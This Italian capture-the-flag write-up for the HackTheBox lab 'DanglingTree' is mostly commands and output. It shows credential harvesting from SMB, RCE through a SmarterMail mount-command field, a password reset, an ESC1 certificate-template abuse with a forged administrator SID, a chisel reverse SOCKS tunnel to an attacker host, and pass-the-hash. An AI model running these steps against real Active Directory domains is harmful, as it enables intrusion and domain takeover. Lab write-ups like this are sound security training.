# DanglingTree

**Piattaforma:** HackTheBox  
**OS:** Windows Server 2025 (Active Directory Domain Controller)  
**Difficolta:** Hard  
**Flag user:** `[REDACTED]`  
**Flag root:** `[REDACTED]`

---

## Panoramica

DanglingTree e un Domain Controller Windows Server 2025 che simula una kill chain AD realistica. Si parte da credenziali trovate su una share SMB, si sfrutta una CVE su SmarterMail per RCE, poi si abusa di AD CS (ESC1) con un bypass del certificate binding enforcement introdotto da Microsoft nel 2022. Il percorso richiede pivoting interno via tunnel SOCKS e manipolazione di template PKI tramite LDAP.

---

## Recon

### Nmap

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc          [FILTRATO ESTERNAMENTE]
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  winrm
6600/tcp open  Windows Admin Center
17017/tcp open  SmarterMail HTTP API
```

Dominio: `danglingtree.htb`. DC: `dc.danglingtree.htb`.

### SMB Enumeration

```bash
nxc smb 10.129.130.6 --shares -u '' -p ''
```

Share accessibile senza autenticazione: `IT\Security`. Contiene un PDF con un report di sicurezza interno che include credenziali in chiaro:

```
anderson.w : R3dT3am@Acc3ss#01
```

---

## Foothold: anderson.w via Windows Admin Center

Il WAC (Windows Admin Center) e raggiungibile sulla porta 6600. L'applicazione usa un endpoint PowerShell per eseguire comandi sul DC come utente autenticato.

```bash
python3 wac.py
# wac.py: autentica anderson.w via CSRF+RSA-OAEP-256, poi posta
# comandi PS a /api/nodes/dc.danglingtree.htb/features/powershellApi/invokeCommand
```

Accesso in esecuzione PowerShell come `DANGLINGTREE\anderson.w`.

---

## Escalation 1: anderson.w -> svc_mail (CVE-2026-23760)

Dall'enumerazione locale tramite WAC si trova SmarterMail in ascolto su `127.0.0.1:17017`. La CVE-2026-23760 consente a un sysadmin autenticato di montare volumi con un campo `commandMount` che viene eseguito come sistema operativo.

### Autenticazione SmarterMail

```bash
curl -X POST http://127.0.0.1:17017/api/v1/auth/authenticate-user \
  -H 'Content-Type: application/json' \
  -d '{"username":"svc_mail","password":"Pwn3d!2026#Adm"}'
```

Le credenziali `svc_mail:Pwn3d!2026#Adm` sono state trovate nella configurazione di SmarterMail su disco tramite WAC.

### RCE via Mount API

```bash
curl -X POST http://127.0.0.1:17017/api/v1/settings/sysadmin/mount-selected \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"mountPath":"C:\\xpoc","commandMount":"cmd /c whoami > C:\\ProgramData\\out.txt","commandUnmount":"","enabled":true,"readOnly":false,"useArgumentsInCommand":false}'
```

Esecuzione di comandi arbitrari come `DANGLINGTREE\svc_mail`.

---

## Enumerazione AD: alex.o e la catena PKI

### BloodHound come alex.o

Password spray con wordlist personalizzata. Trovata:

```
alex.o : SunsetMountainPeak@2025
```

Raccolta BloodHound come alex.o, con maggiore visibilita LDAP:

```bash
python3 -m bloodhound --use-ldaps -ns 10.129.130.6 \
  -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' -c All --zip
```

**Finding critico:** il gruppo `support-it` ha il diritto `ForceChangePassword` su `jake.h`. Alex.o fa parte di `support-it`.

### Force Password Reset: jake.h

```bash
rpcclient -U "danglingtree.htb/alex.o%SunsetMountainPeak@2025" 10.129.130.6 \
  -c "setuserinfo2 jake.h 23 'H4ck3r@PKI!2026'"
```

Credenziali ottenute: `jake.h : H4ck3r@PKI!2026`

---

## AD CS: ESC1 via Template Injection

### Gruppi di jake.h

- `Template_Editors` - CREATE_CHILD su CN=Certificate Templates
- `Helpdesk_Cert_Support` - ManageCertificates (Officer) sulla CA `danglingtree-DC-CA`
- `DevOps_PKI` - accesso WinRM/RDP

### Creazione del Template ESC1

jake.h puo creare nuovi template certificate. Creo `EmployeeAuthTemplate` via LDAP con:

- `msPKI-Certificate-Name-Flag = 1` (ENROLLEE_SUPPLIES_SUBJECT)
- `pKIExtendedKeyUsage = 1.3.6.1.5.5.7.3.2` (Client Authentication)
- `msPKI-Enrollment-Flag = 0`

```python
# ldap3 con autenticazione NTLM su LDAPS :636
conn.add('CN=EmployeeAuthTemplate,CN=Certificate Templates,...',
    objectClass=['top','pKICertificateTemplate'],
    attributes={
        'msPKI-Certificate-Name-Flag': 1,
        'msPKI-Enrollment-Flag': 0,
        'pKIExtendedKeyUsage': ['1.3.6.1.5.5.7.3.2'],
        'msPKI-Template-Schema-Version': 2,
        ...
    })
```

Poi certipy-ad applica i diritti di enrollment e il template viene aggiunto alla CA.

---

## Bypass Windows Server 2025: SID nel Certificato

### Problema: StrongCertificateBindingEnforcement

Windows Server 2025 rifiuta il PKINIT se il certificato non contiene l'estensione SID (OID `1.3.6.1.4.1.311.25.2`) corrispondente al SID dell'utente in AD. Senza questo, certipy-ad auth restituisce:

```
[-] Object SID mismatch between certificate and user 'administrator'
```

### Soluzione: SOCKS Tunnel via Chisel

La porta RPC 135 e bloccata dall'esterno. Creo un tunnel SOCKS inverso attraverso il DC usando SmarterMail RCE:

```bash
# Sul DC via SmarterMail mount:
C:\ProgramData\chisel.exe client 10.10.15.95:4444 R:socks
```

```bash
# Su Kali:
./chisel_kali server --port 4444 --reverse --socks5
```

### Richiesta Certificato con SID via Tunnel

```bash
proxychains4 -f /tmp/proxychains_chisel.conf certipy-ad req \
  -u 'jake.h@danglingtree.htb' -p 'H4ck3r@PKI!2026' \
  -ca 'danglingtree-DC-CA' -template EmployeeAuthTemplate \
  -upn 'administrator@danglingtree.htb' \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-500' \
  -dc-ip 10.129.130.6 -target 10.129.130.6 \
  -out administrator_sid.pfx
```

Il certificato viene emesso con l'estensione SID incorporata, soddisfacendo il binding enforcement.

---

## Root: PKINIT + Pass-the-Hash

### NT Hash via PKINIT

```bash
certipy-ad auth -pfx administrator_sid.pfx \
  -username administrator -domain danglingtree.htb -dc-ip 10.129.130.6
```

Output:

```
[*] Got hash for 'administrator@danglingtree.htb': aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925
```

### Lettura delle Flag

```bash
wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 \
  Administrator@10.129.130.6 'type C:\Users\noah.b\Desktop\user.txt'
# [REDACTED]

wmiexec.py -hashes :8cacb3a97e460c65d105ca7cd9913925 \
  Administrator@10.129.130.6 'type C:\Users\Administrator\Desktop\root.txt'
# [REDACTED]
```

---

## Kill Chain

```
SMB share (PDF) -> anderson.w
  |
  +-> WAC PowerShell -> svc_mail via CVE-2026-23760
        |
        +-> Password spray -> alex.o
              |
              +-> ForceChangePassword -> jake.h
                    |
                    +-> LDAP template creation (Template_Editors)
                    +-> ManageCertificates (Helpdesk_Cert_Support)
                    +-> Chisel SOCKS tunnel via SmarterMail RCE
                    +-> certipy-ad req -sid -> ESC1 + SID bypass
                          |
                          +-> PKINIT -> Administrator NT hash
                                |
                                +-> wmiexec -> root.txt + user.txt
```

---

## Note Tecniche

- **CVE-2026-23760**: SmarterMail volume mount RCE. Il campo `commandMount` viene eseguito senza sanitizzazione quando il volume viene montato.
- **ESC1**: `ENROLLEE_SUPPLIES_SUBJECT` permette all'enrollee di specificare un UPN arbitrario nel certificato.
- **StrongCertificateBindingEnforcement**: Windows Server 2025 richiede l'estensione SID (OID 1.3.6.1.4.1.311.25.2) nel certificato per PKINIT. certipy-ad req con `-sid` la include nella richiesta, e la CA la incorpora nel certificato emesso.
- **Tunnel SOCKS**: necessario perche RPC 135 e filtrato esternamente. Il tunnel chisel attraverso il DC permette di usare `ncacn_np` (RPC over SMB, porta 445) che invece e raggiungibile.
